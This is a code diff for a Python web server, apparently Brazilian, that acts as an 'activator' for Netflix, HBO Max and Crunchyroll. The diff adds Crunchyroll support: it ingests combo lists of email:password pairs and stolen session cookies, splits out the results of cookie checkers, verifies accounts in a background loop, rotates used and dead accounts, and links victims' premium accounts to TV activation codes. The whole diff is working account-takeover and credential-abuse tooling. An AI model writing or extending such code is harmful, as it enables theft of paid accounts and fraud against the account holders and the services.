+                    "message": "Nenhuma conta Crunchyroll premium encontrada nos combos."
+                }, 404)
+
+            used_account = CURRENT_CRUNCHYROLL_READY
+            success, msg, info = activate_crunchyroll_tv(clean_code, used_account)
+            account_info = info or used_account.get("info", {})
+
+            if success:
+                USED_CRUNCHYROLL_ACCOUNTS.add(used_account["email"])
+                record_history_entry("Crunchyroll", used_account.get("file", "combo.txt"), account_info.get("email", ""), clean_code, account_info.get("plan", "Crunchyroll VIP"), "Sucesso")
+                CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()
+                return self.send_json_response({
+                    "success": True,
+                    "message": msg,
+                    "account": account_info
+                })
+            else:
+                if "sessão" in msg.lower() or "token" in msg.lower():
+                    DEAD_CRUNCHYROLL_ACCOUNTS.add(used_account["email"])
+                    CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()
+                return self.send_json_response({
+                    "success": False,
+                    "message": msg
+                })
         else:
             return self.send_json_response({"success": False, "message": "Serviço desconhecido."}, 400)
 
     def handle_api_cookies(self):
-        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY
+        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, CURRENT_CRUNCHYROLL_READY
         query_service = 'netflix'
         if 'service=hbo' in self.path:
             query_service = 'hbo'
+        elif 'service=crunchyroll' in self.path:
+            query_service = 'crunchyroll'
+
+        if not self.is_service_allowed(query_service):
+            return self.send_json_response({
+                "service": query_service,
+                "total_valid": 0,
+                "active_cookie": "",
+                "cookies": [],
+                "blocked": True,
+                "message": "🔒 Você não tem acesso a esse conteúdo."
+            })
 
         if query_service == 'netflix':
             all_accounts = get_all_netflix_accounts()
@@ -1387,7 +1841,23 @@ class AppRequestHandler(SimpleHTTPRequestHandler):
                     "is_verified": entry.get("validated", False),
                     "is_dead": False
                 })
-            # Selecionado no topo
+            items.sort(key=lambda x: not x["is_selected"])
+        elif query_service == 'crunchyroll':
+            all_accounts = get_all_crunchyroll_accounts()
+            active_email = CURRENT_CRUNCHYROLL_READY["email"] if CURRENT_CRUNCHYROLL_READY else ""
+            items = []
+            for entry in all_accounts:
+                email = entry["info"].get("email", entry.get("file", ""))
+                acc = entry["info"]
+                items.append({
+                    "filename": email,
+                    "email": email,
+                    "country": acc.get("country", "BR"),
+                    "plan": acc.get("plan", "Crunchyroll VIP"),
+                    "is_selected": (email == active_email),
+                    "is_verified": entry.get("validated", False),
+                    "is_dead": False
+                })
             items.sort(key=lambda x: not x["is_selected"])
         else:
             all_accounts = get_all_hbo_accounts()
@@ -1410,12 +1880,12 @@ class AppRequestHandler(SimpleHTTPRequestHandler):
         self.send_json_response({
             "service": query_service,
             "total_valid": len(items),
-            "active_cookie": active_file,
+            "active_cookie": active_email if query_service == 'crunchyroll' else active_file,
             "cookies": items
         })
 
     def handle_api_select_cookie(self):
-        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY
+        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, CURRENT_CRUNCHYROLL_READY
         content_length = int(self.headers.get('Content-Length', 0))
         post_data = self.rfile.read(content_length)
         req = json.loads(post_data.decode('utf-8')) if post_data else {}
@@ -1424,6 +1894,9 @@ class AppRequestHandler(SimpleHTTPRequestHandler):
 
         if not filename:
             return self.send_json_response({"success": False, "message": "Nome do arquivo ausente."}, 400)
+
+        if not self.is_service_allowed(service):
+            return self.send_json_response({"success": False, "message": "🔒 Você não tem acesso a esse conteúdo."}, 403)
 
         if service == 'netflix':
             selected = select_netflix_cookie_by_filename(filename)
@@ -1437,6 +1910,18 @@ class AppRequestHandler(SimpleHTTPRequestHandler):
                 })
             else:
                 return self.send_json_response({"success": False, "message": "Este cookie não está mais ativo na Netflix."}, 404)
+        elif service == 'crunchyroll':
+            selected = select_crunchyroll_account_by_identifier(filename)
+            if selected:
+                CURRENT_CRUNCHYROLL_READY = selected
+                return self.send_json_response({
+                    "success": True,
+                    "message": f"Conta Crunchyroll {selected['info'].get('email', filename)} selecionada!",
+                    "account": selected["info"],
+                    "cookie_name": selected.get("email", filename)
+                })
+            else:
+                return self.send_json_response({"success": False, "message": "Não foi possível ativar esta conta Crunchyroll."}, 404)
         else:
             selected = select_hbo_cookie_by_filename(filename)
             if selected:
@@ -1471,9 +1956,16 @@ class AppRequestHandler(SimpleHTTPRequestHandler):
 
         saved_netflix = 0
         saved_hbo = 0
+        saved_crunchyroll = 0
 
         def detect_service_for_text(text: str, filename: str = "") -> str:
             lower = (text + " " + filename).lower()
+            if 'crunchyroll' in lower or 'crunchy' in lower:
+                return 'crunchyroll'
+            if global_service in ['crunchyroll', 'cr']:
+                return 'crunchyroll'
+            if ('@' in text and (':' in text or '|' in text)) and ('securentflxid' not in lower and 'max.com' not in lower and 'st=' not in lower and 'netflix' not in lower):
+                return 'crunchyroll'
             if 'securentflxid' in lower or 'netflix' in lower:
                 return 'netflix'
             elif 'max.com' in lower or 'hbomax' in lower or 'beam' in lower or 'hbo' in lower:
@@ -1482,18 +1974,32 @@ class AppRequestHandler(SimpleHTTPRequestHandler):
                 return 'hbomax'
             return 'netflix'
 
-        def save_cookie_content(svc: str, fname: str, content: str) -> bool:
-            nonlocal saved_netflix, saved_hbo
-            target_dir = HBO_COOKIES_FOLDER if svc in ['hbo', 'hbomax', 'max'] else NETFLIX_COOKIES_FOLDER
+        def save_cookie_content(svc: str, fname: str, content: str, append_mode: bool = False) -> bool:
+            nonlocal saved_netflix, saved_hbo, saved_crunchyroll
+            if svc == 'crunchyroll':
+                target_dir = CRUNCHYROLL_COMBO_FOLDER
+            elif svc in ['hbo', 'hbomax', 'max']:
+                target_dir = HBO_COOKIES_FOLDER
+            else:
+                target_dir = NETFLIX_COOKIES_FOLDER
             os.makedirs(target_dir, exist_ok=True)
             clean_name = re.sub(r'[^a-zA-Z0-9_\-\.\[\]@]', '_', os.path.basename(fname))
             if not clean_name.endswith('.txt') and not clean_name.endswith('.json'):
                 clean_name += '.txt'
             fpath = os.path.join(target_dir, clean_name)
             try:
-                with open(fpath, 'w', encoding='utf-8') as out_f:
-                    out_f.write(content)
-                if svc in ['hbo', 'hbomax', 'max']:
+                mode = 'a' if (append_mode and os.path.exists(fpath)) else 'w'
+                with open(fpath, mode, encoding='utf-8') as out_f:
+                    if mode == 'a':
+                        out_f.write('\n' + content.strip() + '\n')
+                    else:
+                        out_f.write(content)
+                if svc == 'crunchyroll':
+                    c_lines = [l for l in content.splitlines() if (':' in l or '|' in l) and '@' in l]
+                    saved_crunchyroll += max(1, len(c_lines))
+                    DEAD_CRUNCHYROLL_ACCOUNTS.clear()
+                    USED_CRUNCHYROLL_ACCOUNTS.clear()
+                elif svc in ['hbo', 'hbomax', 'max']:
                     saved_hbo += 1
                     USED_HBO_COOKIES.discard(fpath)
                     USED_HBO_COOKIES.discard(clean_name)
@@ -1506,6 +2012,53 @@ class AppRequestHandler(SimpleHTTPRequestHandler):
             except Exception:
                 return False
 
+        def split_multiple_raw_cookies(text: str) -> List[str]:
+            """Divide de forma inteligente lotes colados de cookies ou combos em itens separados sem corrompê-los."""
+            text = text.strip()
+            if not text:
+                return []
+
+            # 1. Se for lista de combos (Crunchyroll: email:senha linha a linha)
+            lines = [line.strip() for line in text.splitlines() if line.strip()]
+            combo_lines = [l for l in lines if re.match(r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+[:|][^\s]+', l)]
+            if len(combo_lines) >= 1 and len(combo_lines) == len(lines):
+                # Formato padrão de lista de combos: preserva todas as contas em um arquivo único organizado
+                return [text]
+
+            # 2. Se contiver múltiplos blocos do formato padrão de checadores (ex: NETFLIX COOKIE CHECKER — HIT)
+            checker_pattern = re.compile(r'(?:^|\r?\n)(?=[=]{10,}\s*\r?\n\s*NETFLIX COOKIE CHECKER)', re.MULTILINE)
+            checker_parts = [p.strip() for p in checker_pattern.split(text) if p.strip()]
+            if len(checker_parts) > 1:
+                valid_hits = [p for p in checker_parts if any(k in p for k in ['NetflixId', 'SecureNetflixId', 'Email:', '📧'])]
+                if valid_hits:
+                    return valid_hits
+
+            # 3. Se contiver múltiplos cookies Netscape com SecureNetflixId ou NetflixId
+            netscape_pattern = re.compile(r'(?:^|\r?\n)(?=(?:\.netflix\.com|netflix\.com)\t[^\r\n]*\t(?:SecureNetflixId|NetflixId)\t)', re.MULTILINE)
+            netscape_parts = [p.strip() for p in netscape_pattern.split(text) if p.strip()]
+            if len(netscape_parts) > 1:
+                return netscape_parts
+
+            # 4. Se contiver múltiplos tokens HBO Max (st=eyJ...)
+            st_matches = list(re.finditer(r'(?:st=)(eyJ[a-zA-Z0-9_\-\.]+)', text))
+            if len(st_matches) > 1:
+                return [f"st={m.group(1)}" for m in st_matches]
+
+            # 5. Se contiver delimitadores explícitos de lotes (ex: 5 ou mais '=', '-', ou '#') onde cada bloco tem cookie
+            delim_pattern = re.compile(r'\r?\n\s*[-=#]{5,}\s*\r?\n')
+            delim_parts = [p.strip() for p in delim_pattern.split(text) if p.strip()]
+            valid_delim = [p for p in delim_parts if any(k in p for k in ['NetflixId', 'SecureNetflixId', 'st=', '@'])]
+            if len(valid_delim) > 1:
+                return valid_delim
+
+            return [text]
+
+        # 0. Suporte direto a conta única Crunchyroll via JSON { "email": "...", "password": "..." }
+        single_email = req.get('email', '').strip()
+        single_pwd = req.get('password', '').strip() or req.get('pwd', '').strip()
+        if single_email and single_pwd and ('@' in single_email):
+            save_cookie_content('crunchyroll', 'contas_crunchyroll.txt', f"{single_email}:{single_pwd}", append_mode=True)
+
         # 1. Processa múltiplos arquivos (da pasta inteira arrastada ou selecionada)
         for idx, item in enumerate(files):
             fname = item.get('name', '').strip() or f"cookie_{idx + 1}.txt"
@@ -1516,82 +2069,108 @@ class AppRequestHandler(SimpleHTTPRequestHandler):
             svc = global_service if global_service not in ['auto', ''] else detect_service_for_text(content, fname)
             save_cookie_content(svc, fname, content)
 
-        # 2. Processa texto bruto (pode conter 1 cookie ou dezenas/centenas separados por quebras ou formato de lista)
+        # 2. Processa texto bruto (pode conter 1 cookie, lote de cookies ou lista de contas Crunchyroll email:senha)
         if raw_text:
             timestamp = int(time.time())
-            # Verifica se é um array JSON contendo vários cookies ou uma única lista
-            is_json = raw_text.startswith('[') or raw_text.startswith('{')
-            if is_json:
-                try:
-                    parsed_json = json.loads(raw_text)
-                    # Se for lista de objetos com 'name'/'value' (1 cookie único do EditThisCookie)
-                    if isinstance(parsed_json, list) and parsed_json and isinstance(parsed_json[0], dict) and 'name' in parsed_json[0]:
-                        svc = global_service if global_service not in ['auto', ''] else detect_service_for_text(raw_text, "")
-                        save_cookie_content(svc, f"import_json_{timestamp}.json", raw_text)
-                    # Se for lista de múltiplas contas
-                    elif isinstance(parsed_json, list) and parsed_json and (isinstance(parsed_json[0], list) or isinstance(parsed_json[0], dict)):
-                        for sub_idx, sub_item in enumerate(parsed_json):
-                            sub_content = json.dumps(sub_item, indent=2)
-                            svc = global_service if global_service not in ['auto', ''] else detect_service_for_text(sub_content, "")
-                            save_cookie_content(svc, f"import_batch_{timestamp}_{sub_idx + 1}.json", sub_content)
-                    else:
-                        svc = global_service if global_service not in ['auto', ''] else detect_service_for_text(raw_text, "")
-                        save_cookie_content(svc, f"import_json_{timestamp}.json", raw_text)
-                except Exception:
-                    svc = global_service if global_service not in ['auto', ''] else detect_service_for_text(raw_text, "")
-                    save_cookie_content(svc, f"import_raw_{timestamp}.txt", raw_text)
-            else:
-                # Verifica se há delimitadores comuns de lote (ex: =====, -----, ou blocos repetidos de netflix.com)
-                blocks = re.split(r'\n\s*[-=]{3,}\s*\n', raw_text)
-                if len(blocks) > 1:
-                    for b_idx, block in enumerate(blocks):
-                        block = block.strip()
-                        if block:
-                            svc = global_service if global_service not in ['auto', ''] else detect_service_for_text(block, "")
-                            save_cookie_content(svc, f"batch_split_{timestamp}_{b_idx + 1}.txt", block)
-                else:
-                    svc = global_service if global_service not in ['auto', ''] else detect_service_for_text(raw_text, "")
-                    save_cookie_content(svc, f"import_raw_{timestamp}.txt", raw_text)
+            svc = global_service if global_service not in ['auto', ''] else detect_service_for_text(raw_text, "")
 
-        total_saved = saved_netflix + saved_hbo
+            # Se for explicitamente contas Crunchyroll (ou formato de combo email:senha)
+            if svc == 'crunchyroll' or ((':' in raw_text or '|' in raw_text) and '@' in raw_text and 'netflix' not in raw_text.lower() and 'securentflxid' not in raw_text.lower()):
+                save_cookie_content('crunchyroll', 'contas_crunchyroll.txt', raw_text, append_mode=True)
+            else:
+                is_json = raw_text.startswith('[') or raw_text.startswith('{')
+                if is_json:
+                    try:
+                        parsed_json = json.loads(raw_text)
+                        if isinstance(parsed_json, list) and parsed_json and isinstance(parsed_json[0], dict) and 'name' in parsed_json[0]:
+                            save_cookie_content(svc, f"import_json_{timestamp}.json", raw_text)
+                        elif isinstance(parsed_json, list) and parsed_json and (isinstance(parsed_json[0], list) or isinstance(parsed_json[0], dict)):
+                            for sub_idx, sub_item in enumerate(parsed_json):
+                                sub_content = json.dumps(sub_item, indent=2)
+                                save_cookie_content(svc, f"import_batch_{timestamp}_{sub_idx + 1}.json", sub_content)
+                        else:
+                            save_cookie_content(svc, f"import_json_{timestamp}.json", raw_text)
+                    except Exception:
+                        save_cookie_content(svc, f"import_raw_{timestamp}.txt", raw_text)
+                else:
+                    raw_chunks = split_multiple_raw_cookies(raw_text)
+                    for b_idx, chunk in enumerate(raw_chunks):
+                        chunk = chunk.strip()
+                        if chunk:
+                            save_cookie_content(svc, f"batch_cookie_{timestamp}_{b_idx + 1}.txt", chunk)
+
+        total_saved = saved_netflix + saved_hbo + saved_crunchyroll
         if total_saved > 0:
+            global SERVER_DATA_VERSION
+            SERVER_DATA_VERSION = time.time()
             sync_cookies_bundle()
-            threading.Thread(target=self._prewarm_after_upload, args=('netflix' if saved_netflix else 'hbomax',), daemon=True).start()
+            COOKIE_FAIL_COUNTS.clear()
+            
+            # Limpa caches em memória para recarregar o novo estoque instantaneamente
+            with VALID_NETFLIX_LOCK:
+                VALID_NETFLIX_BY_FILE.clear()
+                VALID_NETFLIX_POOL.clear()
+            with VALID_HBO_LOCK:
+                VALID_HBO_BY_FILE.clear()
+                VALID_HBO_POOL.clear()
+            with VALID_CRUNCHYROLL_LOCK:
+                VALID_CRUNCHYROLL_BY_EMAIL.clear()
+                VALID_CRUNCHYROLL_POOL.clear()
+
+            if saved_netflix:
+                CURRENT_NETFLIX_READY = find_netflix_fast_cookie()
+            elif saved_crunchyroll:
+                CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()
+            else:
+                CURRENT_HBO_READY = find_hbo_valid_cookie()
+
             return self.send_json_response({
                 "success": True,
                 "saved_count": total_saved,
                 "saved_netflix": saved_netflix,
                 "saved_hbo": saved_hbo,
-                "message": f"🎉 {total_saved} cookie(s) importado(s) com sucesso! ({saved_netflix} Netflix, {saved_hbo} HBO Max)"
+                "saved_crunchyroll": saved_crunchyroll,
+                "server_version": SERVER_DATA_VERSION,
+                "message": f"🎉 {total_saved} conta(s)/cookie(s) importado(s) com sucesso! ({saved_netflix} Netflix, {saved_hbo} HBO Max, {saved_crunchyroll} Crunchyroll)"
             })
         else:
             return self.send_json_response({"success": False, "message": "Nenhum arquivo ou texto válido enviado."}, 400)
 
     def _prewarm_after_upload(self, service: str):
-        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY
-        time.sleep(0.5)
+        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, CURRENT_CRUNCHYROLL_READY
+        time.sleep(0.3)
         if service == 'netflix':
             CURRENT_NETFLIX_READY = find_netflix_fast_cookie()
+        elif service == 'crunchyroll':
+            CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()
         else:
             CURRENT_HBO_READY = find_hbo_valid_cookie()
 
     def handle_api_reset_cache(self):
-        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, DEAD_NETFLIX_COOKIES, USED_NETFLIX_COOKIES, USED_HBO_COOKIES
+        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, CURRENT_CRUNCHYROLL_READY, DEAD_NETFLIX_COOKIES, USED_NETFLIX_COOKIES, USED_HBO_COOKIES, DEAD_CRUNCHYROLL_ACCOUNTS, USED_CRUNCHYROLL_ACCOUNTS, SERVER_DATA_VERSION
         DEAD_NETFLIX_COOKIES.clear()
+        COOKIE_FAIL_COUNTS.clear()
         tv2.USED_COOKIES.clear()
         USED_HBO_COOKIES.clear()
+        DEAD_CRUNCHYROLL_ACCOUNTS.clear()
+        USED_CRUNCHYROLL_ACCOUNTS.clear()
+        SERVER_DATA_VERSION = time.time()
         CURRENT_NETFLIX_READY = find_netflix_fast_cookie()
         CURRENT_HBO_READY = find_hbo_valid_cookie()
+        CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()
         return self.send_json_response({
             "success": True,
-            "message": "Cache de cookies reinicializado! Todas as contas estão disponíveis para re-teste."
+            "server_version": SERVER_DATA_VERSION,
+            "message": "Cache de cookies e combos reinicializado! Todas as contas estão disponíveis para re-teste."
         })
 
     def handle_api_admin_stats(self):
         all_nf = get_all_netflix_accounts()
         all_hbo = get_all_hbo_accounts()
+        all_cr = get_all_crunchyroll_accounts()
         verified_nf = [a for a in all_nf if a.get("validated")]
         verified_hbo = [a for a in all_hbo if a.get("validated")]
+        verified_cr = [a for a in all_cr if a.get("validated")]
         return self.send_json_response({
             "netflix_total": len(all_nf),
             "netflix_verified": len(verified_nf),
@@ -1599,6 +2178,9 @@ class AppRequestHandler(SimpleHTTPRequestHandler):
             "hbo_total": len(all_hbo),
             "hbo_verified": len(verified_hbo),
             "hbo_dead": len(USED_HBO_COOKIES),
+            "crunchyroll_total": len(all_cr),
+            "crunchyroll_verified": len(verified_cr),
+            "crunchyroll_dead": len(DEAD_CRUNCHYROLL_ACCOUNTS),
             "keep_alive": True,
             "timestamp": time.time()
         })
@@ -1623,6 +2205,7 @@ def background_verifier_loop():
         try:
             get_verified_netflix_cookies(min_count=8)
             get_verified_hbo_cookies(min_count=4)
+            get_verified_crunchyroll_accounts(min_count=2)
         except Exception:
             pass
         time.sleep(12)
@@ -1660,7 +2243,7 @@ def run_server(port=PORT):
     start_background_scanner()
     with ThreadedTCPServer(("", port), AppRequestHandler) as httpd:
         print(f"\n=======================================================")
-        print(f" 🚀 ATIVADOR NETFLIX & HBO MAX INICIADO COM SUCESSO!")
+        print(f" 🚀 ATIVADOR NETFLIX, HBO MAX & CRUNCHYROLL INICIADO COM SUCESSO!")
         print(f" ⚡ Anti-Sleep 24h: ATIVADO (Render sempre acordado)")
         print(f" 💻 Acesse no PC:      http://localhost:{port}")
         print(f" 📱 Acesse no Celular: http://{local_ip}:{port}  (no mesmo Wi-Fi)")
